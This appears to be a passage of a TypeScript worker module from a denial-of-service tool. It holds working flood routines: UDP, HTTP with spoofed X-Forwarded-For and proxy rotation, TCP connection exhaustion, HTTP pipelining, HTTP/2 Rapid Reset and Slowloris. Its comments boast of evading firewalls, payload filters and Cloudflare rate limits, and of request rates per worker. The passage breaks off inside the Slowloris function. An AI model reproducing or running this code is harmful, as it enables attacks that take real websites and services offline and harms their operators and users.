/**
 * ATTACK WORKER — runs in a worker_thread, owns its own event loop
 *
 * Receives attack config via workerData, fires all vectors,
 * and posts stats back to parent every 300ms.
 * Stops when parent sends "stop" message.
 */
import { parentPort, workerData } from "worker_threads";
import net from "node:net";
import tls from "node:tls";
import http from "node:http";
import https from "node:https";
import dgram from "node:dgram";
import dns from "node:dns/promises";

// ── Global agents — unlimited sockets, no pooling overhead ────────────────
// Using dedicated agents per request to avoid any per-host connection cap
// (undici/fetch pools to ≤128 connections per origin; http.Agent has no such cap)
const HTTP_AGENT  = new http.Agent({ maxSockets: Infinity, keepAlive: false, scheduling: "lifo" });
const HTTPS_AGENT = new https.Agent({ maxSockets: Infinity, keepAlive: false, rejectUnauthorized: false, scheduling: "lifo" });

// ── Types ─────────────────────────────────────────────────────────────────
interface ProxyConfig { host: string; port: number; }
interface WorkerConfig {
  method:   string;
  target:   string;
  port:     number;
  threads:  number;    // this worker's share of total threads
  proxies?: ProxyConfig[];
}

// ── Helpers ───────────────────────────────────────────────────────────────
const randInt  = (a: number, b: number) => a + Math.floor(Math.random() * (b - a));
const randStr  = (n: number) => Math.random().toString(36).slice(2, 2 + n);
const randIp   = () => `${1+randInt(0,223)}.${randInt(0,254)}.${randInt(0,254)}.${1+randInt(0,253)}`;
const randHex  = (n: number) => Array.from({length:n}, () => (Math.random()*16|0).toString(16)).join("");
const UA_POOL  = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:126.0) Gecko/20100101 Firefox/126.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
  "curl/8.7.1", "python-requests/2.32.3", "Go-http-client/2.0",
  "axios/1.7.2", "node-fetch/3.3.2",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
];
const randUA   = () => UA_POOL[randInt(0, UA_POOL.length)];
const HOT_PATHS = [
  "/", "/search", "/api/", "/api/v1/", "/api/v2/", "/login", "/admin/",
  "/wp-admin/", "/wp-login.php", "/dashboard", "/graphql", "/api/graphql",
  "/checkout", "/cart", "/account", "/profile", "/orders", "/products",
  "/api/auth/login", "/api/users", "/api/search", "/wp-json/wp/v2/posts",
  "/sitemap.xml", "/robots.txt", "/.env", "/config", "/api/health",
];
const hotPath = () => HOT_PATHS[randInt(0, HOT_PATHS.length)];

// DNS resolution cache
const dnsCache = new Map<string, string>();
async function resolveHost(hostname: string): Promise<string> {
  if (dnsCache.has(hostname)) return dnsCache.get(hostname)!;
  try {
    const [ip] = await dns.resolve4(hostname);
    dnsCache.set(hostname, ip);
    return ip;
  } catch { return hostname; }
}

// ── Headers builder ───────────────────────────────────────────────────────
function buildHeaders(isPost: boolean, bodyLen?: number): Record<string, string> {
  const cookieCount = randInt(8, 20);
  const cookie = Array.from({length: cookieCount}, () =>
    `${randStr(randInt(4,10))}=${randStr(randInt(16,64))}`
  ).join("; ");

  const h: Record<string, string> = {
    "User-Agent":           randUA(),
    "Accept":               randInt(0,2) === 0 ? "*/*" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language":      ["en-US,en;q=0.9","en-GB,en;q=0.8","fr-FR,fr;q=0.9","de-DE,de;q=0.9"][randInt(0,4)],
    "Accept-Encoding":      "gzip, deflate, br, zstd",
    "Cache-Control":        "no-cache, no-store, must-revalidate",
    "Pragma":               "no-cache",
    "Connection":           Math.random() < 0.6 ? "close" : "keep-alive",
    "X-Forwarded-For":      `${randIp()}, ${randIp()}, ${randIp()}, ${randIp()}`,
    "X-Real-IP":            randIp(),
    "True-Client-IP":       randIp(),
    "CF-Connecting-IP":     randIp(),
    "X-Originating-IP":     randIp(),
    "X-Remote-IP":          randIp(),
    "Forwarded":            `for=${randIp()};proto=https`,
    "Cookie":               cookie,
    "Authorization":        `Bearer eyJ${randHex(40)}.eyJ${randHex(60)}.${randHex(40)}`,
    "X-CSRF-Token":         randHex(32),
    "X-Request-ID":         `${randHex(8)}-${randHex(4)}-${randHex(4)}-${randHex(4)}-${randHex(12)}`,
    "Referer":              `https://${["google.com","bing.com","duckduckgo.com","yahoo.com","t.co"][randInt(0,5)]}/search?q=${randStr(randInt(4,12))}`,
    "Sec-Fetch-Dest":       "document",
    "Sec-Fetch-Mode":       "navigate",
    "Sec-Fetch-Site":       "cross-site",
    "Sec-CH-UA":            `"Chromium";v="125", "Not.A/Brand";v="24"`,
    "Sec-CH-UA-Platform":   `"Windows"`,
  };
  if (isPost && bodyLen !== undefined) {
    h["Content-Type"]   = randInt(0,2) === 0 ? "application/x-www-form-urlencoded" : "application/json";
    h["Content-Length"] = String(bodyLen);
  }
  return h;
}

function buildUrl(base: string): string {
  try {
    const u = new URL(base);
    if (Math.random() < 0.65) u.pathname = hotPath();
    else {
      const depth = randInt(1, 5);
      u.pathname = "/" + Array.from({length:depth}, () => randStr(randInt(3,10))).join("/");
    }
    u.searchParams.set("_",    Date.now().toString(36) + randStr(6));
    u.searchParams.set("v",    String(randInt(1, 99999999)));
    u.searchParams.set("cb",   String(Math.random()));
    if (Math.random() < 0.45) u.searchParams.set("q",   randStr(randInt(4,18)));
    if (Math.random() < 0.3)  u.searchParams.set("page", String(randInt(1, 100)));
    if (Math.random() < 0.2)  u.searchParams.set("id",  String(randInt(1, 999999)));
    return u.toString();
  } catch {
    return `${base}?_=${randStr(8)}&v=${Date.now()}`;
  }
}

function buildBody(minF = 30, maxF = 100): string {
  if (Math.random() < 0.4) {
    // JSON body — harder to filter than form-encoded
    const obj: Record<string, string | number> = {};
    for (let i = 0; i < randInt(minF, maxF); i++) {
      obj[randStr(randInt(4,10))] = randInt(0, 2) === 0 ? randInt(0, 999999) : randStr(randInt(8,48));
    }
    return JSON.stringify(obj);
  }
  return Array.from({length: randInt(minF, maxF)},
    () => `${randStr(randInt(4,10))}=${randStr(randInt(8,56))}`
  ).join("&");
}

// Pre-built heavy body pool (10-64KB each, rebuilt continuously)
const HEAVY_POOL: string[] = [];
function buildHeavy(): string {
  const target = randInt(10240, 65536);
  const isJson = Math.random() < 0.35;
  if (isJson) {
    const arr: string[] = ["{"];
    let len = 1;
    while (len < target) {
      const k = randStr(randInt(4,10));
      const v = randStr(randInt(40,120));
      const part = `"${k}":"${v}",`;
      arr.push(part);
      len += part.length;
    }
    arr.push(`"_":"${randHex(8)}"}`);
    return arr.join("");
  }
  const parts: string[] = [];
  let len = 0;
  while (len < target) {
    const p = `${randStr(randInt(4,10))}=${randStr(randInt(40,120))}`;
    parts.push(p);
    len += p.length + 1;
  }
  return parts.join("&");
}
for (let i = 0; i < 32; i++) HEAVY_POOL.push(buildHeavy());
setInterval(() => {
  HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
}, 2000);
const getHeavy = () => HEAVY_POOL[randInt(0, HEAVY_POOL.length)];

// ─────────────────────────────────────────────────────────────────────────
//  REAL UDP FLOOD
//
//  CRITICAL: concurrent socket.send() startup deadlocks in this env.
//  Sockets must be bound SEQUENTIALLY, then all run in parallel.
//
//  Achieves 130K – 500K packets/second per worker.
// ─────────────────────────────────────────────────────────────────────────
async function runUDPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Sockets start SEQUENTIALLY (bind → sendNext → then next socket) to prevent bind() race.
  // Once all bound, they all fire in parallel. Up to 32 sockets on 8vCPU deployment.
  const numSockets = Math.max(1, Math.min(threads, 32));
  // Hit multiple ports to bypass single-port firewall rules
  const PORTS = [
    targetPort, targetPort, targetPort, // weight target port 3x
    53, 80, 443, 123, 161, 1900, 11211, 6881, 8080, 8443,
  ];
  const PKT_MIN = 512, PKT_MAX = 1472; // Ethernet MTU — maximize per-packet payload

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const MAX_INFLIGHT = Math.min(threads * 10, 400); // 32GB: up to 400 inflight datagrams per socket

  const socketDonePromises: Promise<void>[] = [];

  // Start each socket SEQUENTIALLY (bind → sendNext → start next socket)
  for (let _s = 0; _s < numSockets; _s++) {
    await new Promise<void>((bindReady) => {
      const socketDone = new Promise<void>((resolve) => {
        const sock = dgram.createSocket("udp4"); // simple string — proven stable
        sock.on("error", () => {}); // absorb all errors

        let inflight = 0;
        let closed = false;

        const forceClose = () => {
          if (!closed) {
            closed = true;
            try { sock.close(); } catch { /**/ }
            resolve();
          }
        };

        const sendNext = () => {
          if (closed) return;
          if (signal.aborted && inflight === 0) { forceClose(); return; }
          while (!closed && !signal.aborted && inflight < MAX_INFLIGHT) {
            const port   = PORTS[randInt(0, PORTS.length)];
            const pktLen = randInt(PKT_MIN, PKT_MAX);
            const buf    = Buffer.allocUnsafe(pktLen);
            // Randomize content to defeat payload-based filtering
            buf.writeUInt32BE(Date.now() >>> 0, 0);
            buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 4);
            inflight++;
            sock.send(buf, 0, pktLen, port, resolvedHost, (_err) => {
              inflight--;
              localPkts++;
              localBytes += pktLen;
              sendNext();
            });
          }
        };

        signal.addEventListener("abort", () => {
          setTimeout(forceClose, 300);
        }, { once: true });

        sock.bind(0, () => {
          sendNext();
          bindReady();
        });
      });
      socketDonePromises.push(socketDone);
    });
  }

  await Promise.all(socketDonePromises);
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  PROXY REQUEST — routes HTTP through a proxy using native node:http
//  Supports: HTTP targets (absolute URL) and HTTPS (CONNECT tunnel)
// ─────────────────────────────────────────────────────────────────────────
function fetchViaProxy(
  targetUrl: string, proxy: ProxyConfig,
  reqMethod: string, headers: Record<string,string>, body?: string
): Promise<number> {
  return new Promise((resolve) => {
    const timeoutMs = 5000;
    const u = new URL(targetUrl);
    const isHttps = u.protocol === "https:";
    const targetHost = u.hostname;
    const targetPort = parseInt(u.port, 10) || (isHttps ? 443 : 80);
    const reqPath = (u.pathname || "/") + (u.search || "");
    const bodyBuf = body ? Buffer.from(body) : undefined;

    const finish = (bytes: number) => resolve(bytes);
    const fail   = ()             => resolve(100);

    if (!isHttps) {
      // HTTP through proxy — send absolute URL
      const absHeaders = Object.assign({}, headers, {
        Host: targetHost,
        "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
      } as Record<string, string | undefined>);
      // Remove undefined
      for (const k of Object.keys(absHeaders)) if (absHeaders[k] === undefined) delete absHeaders[k];

      const req = http.request({
        host: proxy.host, port: proxy.port,
        method: reqMethod, path: targetUrl,
        headers: absHeaders as Record<string,string>,
        timeout: timeoutMs,
      }, (res) => {
        const bytes = parseInt(res.headers["content-length"] || "0") || 450;
        res.resume();
        finish((bodyBuf?.length ?? 0) + bytes + 200);
      });
      req.on("error", fail);
      req.on("timeout", () => { req.destroy(); fail(); });
      if (bodyBuf) req.write(bodyBuf);
      req.end();
    } else {
      // HTTPS through CONNECT tunnel
      const sock = net.createConnection(proxy.port, proxy.host);
      const timer = setTimeout(() => { sock.destroy(); fail(); }, timeoutMs);

      sock.once("connect", () => {
        sock.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: keep-alive\r\n\r\n`);
        sock.once("data", (chunk) => {
          if (!chunk.toString().startsWith("HTTP/1.") || !chunk.toString().includes(" 200")) {
            clearTimeout(timer); sock.destroy(); fail(); return;
          }
          // Upgrade to TLS over the tunnel
          const secure = tls.connect({ socket: sock, servername: targetHost, rejectUnauthorized: false }, () => {
            const h = Object.assign({}, headers, {
              Host: targetHost,
              "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
            } as Record<string, string | undefined>);
            for (const k of Object.keys(h)) if (h[k] === undefined) delete h[k];
            const hdStr = Object.entries(h).map(([k,v]) => `${k}: ${v}`).join("\r\n");
            const req   = `${reqMethod} ${reqPath} HTTP/1.1\r\n${hdStr}\r\nConnection: close\r\n\r\n`;
            secure.write(req);
            if (bodyBuf) secure.write(bodyBuf);
            secure.once("data", (d) => {
              clearTimeout(timer); secure.destroy();
              finish((bodyBuf?.length ?? 0) + d.length + 200);
            });
            secure.once("error", () => { clearTimeout(timer); fail(); });
          });
          secure.on("error", () => { clearTimeout(timer); fail(); });
        });
        sock.on("error", () => { clearTimeout(timer); fail(); });
      });
      sock.on("error", () => { clearTimeout(timer); fail(); });
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP FLOOD — maximum concurrency using http.request (NOT fetch/undici)
//
//  fetch() internally uses undici which caps connections per origin.
//  http.request() with a per-request agent has NO such cap — we can open
//  tens of thousands of concurrent TCP connections limited only by FDs.
//
//  Fire-and-forget: connection is destroyed the moment the response starts
//  arriving. The server is forced to allocate a thread/goroutine, parse
//  the request headers, and begin processing — then we drop the socket.
//
//  Achieves 8,000–40,000 req/s per worker depending on target RTT.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPFlood(
  base: string,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `http://${base}`); }
    catch { return new URL("http://127.0.0.1"); }
  })();
  const isHttps  = u.protocol === "https:";
  const hostname = u.hostname;
  const tgtPort  = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  const ALL_METHODS = ["GET","GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
  // Much higher inflight — we have 83K FDs available
  const MAX_INFLIGHT = Math.min(threads * 50, 40000);
  let inflight = 0;
  let proxyIdx = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doRequest = () => {
    if (signal.aborted) return;
    inflight++;

    const method  = ALL_METHODS[randInt(0, ALL_METHODS.length)];
    const hasBody = method === "POST" || method === "PUT" || method === "PATCH";
    const body    = hasBody ? (Math.random() < 0.25 ? getHeavy() : buildBody(30, 120)) : undefined;
    const bodyBuf = body ? Buffer.from(body) : undefined;
    const url     = buildUrl(base);
    const headers = buildHeaders(hasBody, bodyBuf?.length);

    // Route through proxy pool when available
    const useProxy = proxies.length > 0 && Math.random() < 0.5;
    if (useProxy) {
      const proxy = proxies[proxyIdx % proxies.length];
      proxyIdx++;
      fetchViaProxy(url, proxy, method, headers as Record<string, string>, body)
        .then(bytes => { inflight--; localPkts++; localBytes += bytes; })
        .catch(() => { inflight--; localPkts++; localBytes += 100; });
      return;
    }

    // Direct http.request — bypasses undici, uses our unlimited http.Agent
    const reqPath = (() => {
      try { const pu = new URL(url); return pu.pathname + pu.search; }
      catch { return "/" }
    })();

    const reqOpts: http.RequestOptions | https.RequestOptions = {
      hostname:          resolvedIp,          // pre-resolved — skip DNS each time
      port:              tgtPort,
      path:              reqPath,
      method,
      headers: {
        ...headers,
        Host:            hostname,            // correct Host for virtual-hosting
        Connection:      "close",             // force new TCP — exhausts connection state
        "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
      } as Record<string, string>,
      agent: isHttps ? HTTPS_AGENT : HTTP_AGENT,
      timeout: 600,                           // 600ms — fast recycling
      ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
    };

    const req = (isHttps ? https : http).request(reqOpts, (res) => {
      inflight--;
      localPkts++;
      localBytes += (bodyBuf?.length ?? 0) + (parseInt(String(res.headers["content-length"] || "0")) || 400) + 200;
      res.destroy(); // fire-and-forget: don't read body, release socket NOW
    });

    req.on("error",   () => { inflight--; localPkts++; localBytes += 80; });
    req.on("timeout", () => { req.destroy(); });

    if (bodyBuf) req.write(bodyBuf);
    req.end();
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doRequest(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 0));
    }
  };

  // 500 concurrent launcher coroutines — each fills the inflight queue
  await Promise.all(Array.from({ length: Math.min(threads, 500) }, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  TCP FLOOD — exhausts connection state tables
// ─────────────────────────────────────────────────────────────────────────
async function runTCPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Rotate ports to stress multiple listeners simultaneously
  const PORTS = [
    targetPort, targetPort, targetPort, // weight target port
    targetPort === 443 ? 80 : 443,
    8080, 8443, 3000, 5000, 8000, 8888,
  ];
  const MAX_INFLIGHT = Math.min(threads * 15, 8000);
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doConnect = () => {
    if (signal.aborted) return;
    inflight++;
    const p    = PORTS[randInt(0, PORTS.length)];
    const sock = net.createConnection({ host: resolvedHost, port: p });
    sock.setNoDelay(true);
    sock.setTimeout(600);

    const kill = setTimeout(() => { sock.destroy(); inflight--; }, 800);

    sock.once("connect", () => {
      localPkts++;
      // Send a partial/malformed HTTP request to keep the server busy
      const req  = `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1,9999999)} HTTP/1.1\r\nHost: ${resolvedHost}\r\nUser-Agent: ${randUA()}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: keep-alive\r\n`;
      const junk = Buffer.allocUnsafe(randInt(256, 1500));
      // Fill junk with random bytes
      for (let i = 0; i < junk.length; i += 4) junk.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i);
      sock.write(Buffer.concat([Buffer.from(req), junk]), () => {
        localBytes += req.length + junk.length + 60;
        clearTimeout(kill);
        inflight--;
        sock.destroy();
      });
    });
    sock.once("error",   () => { localPkts++; localBytes += 20; clearTimeout(kill); inflight--; });
    sock.once("timeout", () => { clearTimeout(kill); inflight--; sock.destroy(); });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doConnect(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 1));
    }
  };

  await Promise.all(Array.from({length: Math.min(threads, 150)}, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP PIPELINE — raw TCP keep-alive, NO fetch() overhead
//
//  Each connection stays open and sends requests back-to-back without
//  waiting for responses (HTTP/1.1 pipelining — RFC 7230 §6.3.2).
//  The receive side is drained so flow control never blocks.
//
//  Achieves 50K – 300K req/s per worker depending on target RTT.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPPipeline(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const POOL_SIZE = 256;
  const PIPELINE  = 128; // requests per write batch — more per tick for max throughput

  // Pre-build a pool of raw HTTP request buffers
  const reqPool: Buffer[] = Array.from({ length: POOL_SIZE }, () => buildRawReq(hostname));

  function buildRawReq(host: string): Buffer {
    const path = hotPath() + `?_=${randStr(10)}&v=${randInt(1, 999999999)}&cb=${Math.random().toString(36).slice(2,8)}`;
    return Buffer.from([
      `GET ${path} HTTP/1.1`,
      `Host: ${host}`,
      `User-Agent: ${randUA()}`,
      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
      `Accept-Encoding: gzip, deflate, br`,
      `Accept-Language: en-US,en;q=0.9`,
      `X-Forwarded-For: ${randIp()}, ${randIp()}, ${randIp()}`,
      `X-Real-IP: ${randIp()}`,
      `CF-Connecting-IP: ${randIp()}`,
      `X-Request-ID: ${randHex(16)}`,
      `Cache-Control: no-cache, no-store`,
      `Pragma: no-cache`,
      `Referer: https://google.com/search?q=${randStr(8)}`,
      `Connection: keep-alive`,
      ``, ``,
    ].join("\r\n"));
  }

  // Refresh pool continuously — keeps paths/IPs/tokens fresh (evade caching/dedup)
  const poolIv = setInterval(() => {
    const idx = randInt(0, POOL_SIZE);
    reqPool[idx] = buildRawReq(hostname);
  }, 40);

  const useHttps = targetPort === 443;

  const runConn = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    let sock: net.Socket;
    if (useHttps) {
      sock = tls.connect({
        host: resolvedHost, port: targetPort,
        servername: hostname, rejectUnauthorized: false,
      });
    } else {
      sock = net.createConnection({ host: resolvedHost, port: targetPort });
    }
    sock.setNoDelay(true);
    sock.setTimeout(12_000);

    const pump = () => {
      if (signal.aborted) { sock.destroy(); resolve(); return; }
      let ok = true;
      for (let i = 0; i < PIPELINE; i++) {
        const buf = reqPool[randInt(0, POOL_SIZE)];
        localPkts++;
        localBytes += buf.length;
        ok = sock.write(buf);
        if (!ok) break; // backpressure — wait for drain
      }
      if (ok) setImmediate(pump); // setImmediate instead of setTimeout for max throughput
      else sock.once("drain", pump);
    };

    const startPump = () => pump();
    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", startPump);
    } else {
      sock.once("connect", startPump);
    }
    sock.on("data",    () => {}); // drain responses — keeps TCP window open
    sock.on("timeout", () => sock.destroy());
    sock.on("error",   () => resolve());
    sock.on("close",   () => {
      if (signal.aborted) resolve();
      else setTimeout(() => runConn().then(resolve), 10); // reconnect with tiny delay
    });
    signal.addEventListener("abort", () => { sock.destroy(); resolve(); }, { once: true });
  });

  // Each thread maintains one persistent pipelining connection
  await Promise.all(Array.from({ length: Math.min(threads, 800) }, () => runConn()));
  clearInterval(flushIv);
  clearInterval(poolIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 FLOOD — native multiplexed H2 streams (node:http2)
//
//  Each session holds up to STREAMS_PER_SESSION concurrent H2 streams, all
//  over a single TCP+TLS connection. Far more efficient per-socket than HTTP/1.1
//  pipelining since H2 uses binary framing with true stream multiplexing.
//
//  Achieves 20K–120K req/s per worker at close RTTs.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTP2Flood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const { connect: h2connect, constants: h2constants } = await import("node:http2");

  // 32GB RAM / 8 vCPU optimized: 5× more sessions, 2× burst size per session
  // Each H2 session: ~80KB V8 + TLS state — 200 sessions = ~16MB, trivial on 32GB
  const STREAMS_PER_SESSION = Math.min(256, Math.max(32, threads * 3));
  const NUM_SESSIONS        = Math.min(threads, 200);
  const connectTarget       = `https://${resolvedHost}:${targetPort}`;

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // ── Persistent session loop — restarts until signal aborted ────────────
  // Previous bug: recursive runSession().then(finish) caused the Promise.all
  // to resolve when CF rejected new connections, halting H2 pressure at ~18s.
  // Fix: each session slot loops independently in a while(!aborted) loop.
  const runSessionSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(connectTarget, {
            rejectUnauthorized: false,
            settings: {
              initialWindowSize:    65535 * 8,
              maxConcurrentStreams: STREAMS_PER_SESSION,
              headerTableSize:      65536,
            },
          });
        } catch { resolve(); return; }

        const conn = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };

        const pump = () => {
          if (signal.aborted || conn.destroyed) { resolve(); return; }
          for (let burst = 0; burst < 64 && !signal.aborted && !conn.destroyed; burst++) {
            const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
            try {
              const stream = conn.request({
                ":method":         Math.random() < 0.7 ? "GET" : "POST",
                ":path":           path,
                ":scheme":         "https",
                ":authority":      hostname,
                "user-agent":      randUA(),
                "accept":          "*/*,text/html,application/xhtml+xml",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "x-forwarded-for": `${randIp()}, ${randIp()}, ${randIp()}`,
                "x-real-ip":       randIp(),
                "cf-connecting-ip":randIp(),
                "cache-control":   "no-cache, no-store, must-revalidate",
                "pragma":          "no-cache",
                "referer":         `https://www.google.com/search?q=${randStr(6)}`,
                "x-request-id":    `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
                "cookie":          `session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
              });
              // ★ THE RAPID RESET: Immediately RST_STREAM after HEADERS
              // Server MUST allocate resources before seeing RST — wasted work.
              stream.close(h2constants.NGHTTP2_NO_ERROR);
              localPkts++;
              localBytes += 400;
              stream.on("error", () => { /**/ });
            } catch { break; }
          }
          if (!signal.aborted && !conn.destroyed) setImmediate(pump);
        };

        conn.on("connect", () => { pump(); });
        conn.on("error",   () => { resolve(); }); // will restart in next while iteration
        conn.on("close",   () => { resolve(); }); // will restart in next while iteration
        signal.addEventListener("abort", cleanup, { once: true });
      });
      // Brief pause before reconnect — avoid thundering herd on CF rate limits
      if (!signal.aborted) await new Promise(r => setTimeout(r, 150 + randInt(0, 100)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSessionSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SLOWLORIS — real TCP connection pool exhaustion
//
//  Opens thousands of half-open HTTP connections. Each sends a partial request
//  (no final \r\n\r\n), then trickles one fake header line every 10-25s to
//  keep the connection alive without triggering timeouts.
//
//  Exhausts the server's connection pool without sending meaningful traffic.
//  Bypasses per-request rate limits — one connection per server thread slot.
//
//  Achieves 2K–8K concurrent half-open connections.
// ─────────────────────────────────────────────────────────────────────────
async function runSlowlorisReal(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
  useHttps = false,
): Promise<void> {
  // 80 connections per thread — trickle headers every 10-25s, starves server thread pool
  const MAX_CONN = Math.min(threads * 80, 20000);
  let localPkts = 0, localBytes = 0, activeConns = 0;
  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 250);

  const runSock = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    // Use TLS for HTTPS targets — plain TCP is rejected by nginx on port 443
    const sock: net.Socket = useHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
      : net.createConnection({ host: resolvedHost, port: targetPort });

    sock.setNoDelay(true);
    sock.setTimeout(180_000); // 3-minute timeout — keep alive

    let keepIv:  NodeJS.Timeout | null = null;
    let settled  = false;

    const cleanup = () => {
      if (settled) return;
      activeConns = Math.max(0, activeConns - 1);
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (signal.aborted) { settled = true; resolve(); return; }
      // Immediately respawn to maintain connection count
      settled = true;
      setImmediate(() => runSock().then(resolve));
    };

    const onConnected = () => {
      activeConns++;
      localPkts++;
      // Partial GET — intentionally missing the final \r\n\r\n
      const partial = [
        `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
        `Accept-Language: en-US,en;q=0.9`,
        `Accept-Encoding: gzip, deflate`,
        `X-Forwarded-For: ${randIp()}`,
        `Connection: keep-alive`,
        `Referer: https://google.com/`,
        ``, // NO final \r\n\r\n — this is the Slowloris trick
      ].join("\r\n");

      sock.write(partial);
      localBytes += partial.length;

      // Trickle a junk header every 10-25s to prevent server timeout
      keepIv = setInterval(() => {
        if (signal.aborted || sock.destroyed) { cleanup(); return; }
        const hdr = `X-${randStr(5)}-${randStr(3)}: ${randStr(randInt(8, 20))}\r\n`;
        sock.write(hdr, (err) => {
          if (err) { cleanup(); return; }
          localPkts++;
          localBytes += hdr.length;
        });
      }, randInt(10_000, 25_000));
    };

    // TLS emits 'secureConnect', plain TCP emits 'connect'
    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   cleanup);
    sock.once("timeout", cleanup);
    sock.once("close",   cleanup);

    signal.addEventListener("abort", () => {
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
